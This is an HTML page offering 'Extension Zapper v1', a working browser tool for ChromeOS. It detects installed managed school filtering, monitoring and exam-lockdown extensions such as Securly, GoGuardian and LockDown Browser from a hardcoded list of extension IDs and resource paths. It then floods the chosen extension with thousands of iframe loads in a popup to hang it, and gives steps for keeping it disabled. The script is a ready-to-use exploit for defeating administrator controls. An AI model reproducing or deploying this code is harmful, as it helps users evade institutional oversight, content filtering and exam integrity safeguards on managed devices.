<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Extension Zapper v1 - Crafted Gamz</title>
    <link rel="shortcut icon" href="../favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
      :root {
        --lg-bg-color: rgba(40, 40, 40, 0.3);
        --lg-highlight: rgba(255, 255, 255, 0.15);
        --lg-text: #ffffff;
        --primary-color: #007bff;
        --primary-hover: #0056b3;
        --danger-color: #dc3545;
        --danger-hover: #9c1c28;
      }

      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }

      body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        overflow: hidden;
        width: 100vw;
        height: 100vh;
        color: #333;
      }

      .bg-container {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        overflow: hidden;
        z-index: -1;
      }

      .bg-iframe {
        width: 100%;
        height: 100%;
        border: none;
        display: block;
      }

      header {
        background: rgba(40, 40, 40, 0.5);
        backdrop-filter: blur(10px);
        color: #fff;
        padding: 20px 30px;
        display: flex;
        align-items: center;
        justify-content: center;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        position: relative;
      }

      .back-button {
        position: absolute;
        left: 30px;
        color: white;
        text-decoration: none;
        font-size: 16px;
        padding: 10px 20px;
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(5px);
        border-radius: 10px;
        border: 1px solid rgba(255, 255, 255, 0.2);
        transition: all 0.3s ease;
        display: flex;
        align-items: center;
        gap: 8px;
      }

      .back-button:hover {
        background: rgba(255, 255, 255, 0.2);
        transform: translateX(-3px);
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
      }

      .back-button i {
        font-size: 14px;
      }

      header h1 {
        font-size: 32px;
        font-weight: 300;
        margin: 0;
        text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
      }

      .container {
        max-width: 700px;
        margin: 60px auto 0 auto;
        padding: 40px;
        text-align: center;
        background: rgba(255, 255, 255, 0.15);
        backdrop-filter: blur(10px);
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        border-radius: 20px;
        border: 1px solid rgba(255, 255, 255, 0.2);
      }

      .container p {
        color: var(--lg-text);
        font-size: 16px;
        margin-bottom: 30px;
        line-height: 1.6;
        text-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
      }

      label {
        display: block;
        color: var(--lg-text);
        font-size: 15px;
        margin-bottom: 10px;
        text-align: left;
        font-weight: 500;
        text-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
      }

      select {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        margin-bottom: 20px;
        padding: 14px 18px;
        font-size: 16px;
        border: 2px solid rgba(255, 255, 255, 0.3);
        border-radius: 12px;
        width: 100%;
        background: rgba(60, 60, 60, 0.3);
        color: white;
        backdrop-filter: blur(5px);
        transition: all 0.3s ease;
      }

      select:focus {
        outline: none;
        border-color: rgba(255, 255, 255, 0.5);
        box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
      }

      .slider-container {
        margin: 25px 0;
        text-align: left;
      }

      .slider-wrapper {
        display: flex;
        align-items: center;
        gap: 15px;
        margin-top: 15px;
      }

      input[type="range"] {
        flex-grow: 1;
        height: 8px;
        border-radius: 5px;
        background: rgba(255, 255, 255, 0.2);
        outline: none;
        -webkit-appearance: none;
      }

      input[type="range"]::-webkit-slider-thumb {
        -webkit-appearance: none;
        appearance: none;
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: white;
        cursor: pointer;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        transition: all 0.2s ease;
      }

      input[type="range"]::-webkit-slider-thumb:hover {
        transform: scale(1.2);
        box-shadow: 0 3px 12px rgba(0, 0, 0, 0.4);
      }

      input[type="range"]::-moz-range-thumb {
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: white;
        cursor: pointer;
        border: none;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
      }

      .slider-value {
        color: white;
        font-size: 18px;
        font-weight: 600;
        min-width: 60px;
        text-align: center;
        text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
      }

      button {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        color: #fff;
        border: none;
        padding: 14px 35px;
        font-size: 16px;
        cursor: pointer;
        border-radius: 12px;
        margin-top: 15px;
        transition: all 0.3s ease;
        font-weight: 600;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
      }

      #hangButton {
        background: var(--primary-color);
      }

      #hangButton:hover {
        background: var(--primary-hover);
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
      }

      #killButton {
        display: none;
        background: var(--danger-color);
      }

      #killButton:hover {
        background: var(--danger-hover);
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
      }

      .overlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: rgba(0, 0, 0, 0.85);
        display: none;
        justify-content: center;
        align-items: center;
        z-index: 9999;
        color: #fff;
        font-size: 24px;
        user-select: none;
        flex-direction: column;
      }

      .spinner {
        border: 6px solid rgba(255, 255, 255, 0.3);
        border-top: 6px solid #fff;
        border-radius: 50%;
        width: 50px;
        height: 50px;
        animation: spin 1s linear infinite;
        margin-bottom: 25px;
      }

      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }

      #killExtensionText {
        display: none;
        margin-top: 30px;
        color: var(--lg-text);
        font-size: 16px;
        text-align: center;
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(10px);
        padding: 25px;
        border-radius: 15px;
        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
        border: 1px solid rgba(255, 255, 255, 0.2);
        line-height: 1.6;
      }

      #killExtensionText strong {
        color: #fff;
        font-weight: 600;
      }

      .version-warning {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.4);
        backdrop-filter: blur(10px);
        z-index: 10000;
        display: none;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        padding: 40px;
      }

      .version-warning h3 {
        color: white;
        font-size: 28px;
        text-align: center;
        margin-bottom: 35px;
        user-select: none;
        font-weight: 400;
        line-height: 1.7;
        max-width: 700px;
        text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
        background: rgba(40, 40, 40, 0.5);
        backdrop-filter: blur(15px);
        padding: 30px 40px;
        border-radius: 15px;
        border: 1px solid rgba(255, 255, 255, 0.2);
      }

      .version-warning button {
        background: rgba(60, 60, 60, 0.5);
        backdrop-filter: blur(10px);
        border: 2px solid rgba(255, 255, 255, 0.3);
        padding: 16px 40px;
        font-size: 18px;
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
      }

      .version-warning button:hover {
        background: rgba(80, 80, 80, 0.6);
        box-shadow: 0 12px 35px rgba(0, 0, 0, 0.4);
      }

      @media screen and (max-width: 768px) {
        .container {
          margin: 30px 20px;
          padding: 30px 25px;
        }

        header h1 {
          font-size: 24px;
        }

        .back-button {
          position: static;
          margin-bottom: 10px;
          font-size: 14px;
          padding: 8px 16px;
        }

        header {
          flex-direction: column;
          gap: 10px;
        }

        .slider-wrapper {
          flex-direction: column;
          gap: 10px;
        }

        .slider-value {
          align-self: flex-end;
        }
      }
    </style>
  </head>
  <body>
    <div class="bg-container">
      <iframe src="../bg.html" class="bg-iframe"></iframe>
    </div>

    <header>
      <a href="../specialty.html" class="back-button">
        <i class="fas fa-arrow-left"></i> Back to Specialty
      </a>
      <h1>Crafted Gamz Extension Zapper v1</h1>
    </header>

    <div class="container">
      <p>Extension Zapper allows ChromeOS users to disable managed extensions after the LTMEAT patch.</p>
      
      <label for="iframeSelect" id="labelForIframeSelect">Select extension:</label>
      <select id="iframeSelect"></select>
      
      <div class="slider-container">
        <label for="iframeCountSlider" id="labelForIframeSlider">
          Adjust iframe count below. Start with the default value. If the extension reactivates after a few minutes, increase the count and try again. Note: If your device freezes for more than 2 minutes, decrease the count.
        </label>
        <div class="slider-wrapper">
          <input type="range" id="iframeCountSlider" min="100" max="15000" value="2000" step="100">
          <span class="slider-value" id="iframeCountValue">3000</span>
        </div>
      </div>

      <button onclick="warning();" id="hangButton">
        <i class="fas fa-bolt"></i> Zap Extension
      </button>
      <button id="killButton" onclick="openExtensionPopup();">
        <i class="fas fa-power-off"></i> Finalize
      </button>

      <div id="killExtensionText"></div>
    </div>

    <div class="overlay" id="overlay">
      <div class="spinner"></div>
      <div>Processing... (This will take about 1 minute)</div>
    </div>

    <div class="version-warning" id="versionWarning">
      <h3>If you are seeing this message, you are on a ChromeOS version higher than 134 and therefore this tool will not work for you.</h3>
      <button onclick="document.getElementById('versionWarning').style.display='none'">
        Continue Anyway
      </button>
    </div>

    <script>
      (function () {
        const ua = navigator.userAgent;
        const chromeMatch = ua.match(/Chrome\/(\d+)/);

        if (chromeMatch && parseInt(chromeMatch[1], 10) >= 135) {
          document.getElementById('versionWarning').style.display = 'flex';
        }
      })();

      document.addEventListener("DOMContentLoaded", function() {
        const slider = document.getElementById("iframeCountSlider");
        const sliderValueDisplay = document.getElementById("iframeCountValue");
        const deviceMemory = navigator.deviceMemory || 8;
        const defaultIframeCount = Math.round(deviceMemory * 500);
        const maxIframeCount = Math.round(deviceMemory * 10000);
        slider.value = defaultIframeCount;
        slider.max = maxIframeCount;
        sliderValueDisplay.textContent = defaultIframeCount;
        slider.addEventListener("input", function() {
          sliderValueDisplay.textContent = this.value;
        });
      });

      document.getElementById("iframeCountSlider").addEventListener("input", function() {
        const iframeCountValue = document.getElementById("iframeCountValue");
        iframeCountValue.textContent = this.value;
      });

      async function checkExtensionURL(url) {
        try {
          const response = await fetch(url);
          if (response.ok) {
            return true;
          } else {
            return false;
          }
        } catch (error) {
          return false;
        }
      }

      async function populateSelectOptions() {
        const selectElement = document.getElementById("iframeSelect");
        const extensions = {
          "Securly (3rd ID)": "chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css",
          "Securly (2nd ID)": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
          "Securly (1st ID)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
          "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
          "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
          "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
          "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
          "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
          "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
          "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
          "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
          "Securly Classroom (2nd ID)": "chrome-extension://hkobaiihndnbfhbkmjjfbdimfbdcppdh/notfound.html",
          "Securly Classroom (1st ID)": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
          "Hapara (2nd ID)": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
          "Hapara (1st ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
          "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
          "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
          "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
          "Lightspeed Classroom": "chrome-extension://kkbmdgjglgkkneonnineaohdhabjbgopi/assets/icon-classroom-128.png",
          "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
          "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
          "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
          "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
          "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
          "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
          "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
          "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
          "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
          "classroom.cloud Student": "chrome-extension://mpkdoimpgkhjcicmhmlmgboelebflpla/_locales/lt/messages.json",
          "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
          "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
          "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
          "LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
          "Lugus School": "chrome-extension://eoobggamkobbcpiojefejfglbfcacgca/assets/images/icon_128.png"
        };

        let hasSupportedExtensions = false;
        for (const [name, url] of Object.entries(extensions)) {
          if (await checkExtensionURL(url)) {
            const option = document.createElement("option");
            option.value = url;
            option.textContent = name;
            selectElement.appendChild(option);
            hasSupportedExtensions = true;
          }
        }

        if (!hasSupportedExtensions) {
          const option = document.createElement("option");
          option.value = "";
          option.textContent = "No supported extensions installed";
          selectElement.appendChild(option);
          document.getElementById("hangButton").style.display = "none";
          document.getElementById("iframeCountSlider").style.display = "none";
          try{document.getElementById("labelForIframeSlider").style.display = "none";}catch(err){}
          document.getElementById("iframeCountValue").style.display = "none";
        }
      }
      populateSelectOptions();

      function replaceIframes(container, iframeSrc, iframeCount) {
        for (let i = 0; i < iframeCount; i++) {
          const iframe = document.createElement('iframe');
          iframe.src = iframeSrc;
          iframe.style.width = '100%';
          iframe.style.height = '100px';
          container.appendChild(iframe);
        }
        setTimeout(function() {
          while (container.firstChild) {
            container.removeChild(container.firstChild);
          }
          replaceIframes(container, iframeSrc, iframeCount);
        }, 5);
      }

      function warning() {
        const overlay = document.getElementById("overlay");
        overlay.style.display = "flex";
        const iframeSelect = document.getElementById("iframeSelect");
        const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
        const selectedSrc = iframeSelect.value;
        const iframeCount = parseInt(document.getElementById("iframeCountSlider").value, 10);
        const popup = window.open("", "PopupWindow", "width=100,height=100");
        const popupDocument = popup.document;
        const popupBody = popupDocument.body;
        const iframeContainer = popupDocument.createElement('div');
        iframeContainer.id = 'iframeContainer';
        popupBody.appendChild(iframeContainer);
        replaceIframes(iframeContainer, selectedSrc, iframeCount);
        setTimeout(function() {
          popup.close();
          const killExtensionText = document.getElementById("killExtensionText");
          killExtensionText.innerHTML = "Extension <strong>" + selectedOption + "</strong> has been processed. Press the button above to finalize.";
          setTimeout(function() {
            overlay.style.display = "none";
            killExtensionText.style.display = "block";
            document.getElementById("killButton").style.display = "inline-block";
            document.getElementById("hangButton").style.display = "none";
            document.getElementById("iframeSelect").style.display = "none";
            try{document.getElementById("labelForIframeSelect").style.display = "none";}catch(err){}
            document.getElementById("iframeCountSlider").style.display = "none";
            document.getElementById("iframeCountValue").style.display = "none";
            try{document.getElementById("labelForIframeSlider").style.display = "none";}catch(err){}
            document.getElementById("killButton").setAttribute("data-url", selectedSrc);
          }, 10000);
        }, 5000);
      }

      function openExtensionPopup() {
        const selectedSrc = document.getElementById("killButton").getAttribute("data-url");
        const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
        const killExtensionText = document.getElementById("killExtensionText");
        document.getElementById("killButton").style.display = "none";
        killExtensionText.innerHTML = "Keep this tab open. Navigate to <strong>chrome://extensions/?id=" + extensionId + "</strong> and toggle the \"Allow access to file URLs\" switch twice. The extension has been disabled! You can now close both tabs. To restore the extension, toggle the switch again.";
        window.location.href = selectedSrc;
      }
    </script>
  </body>
</html>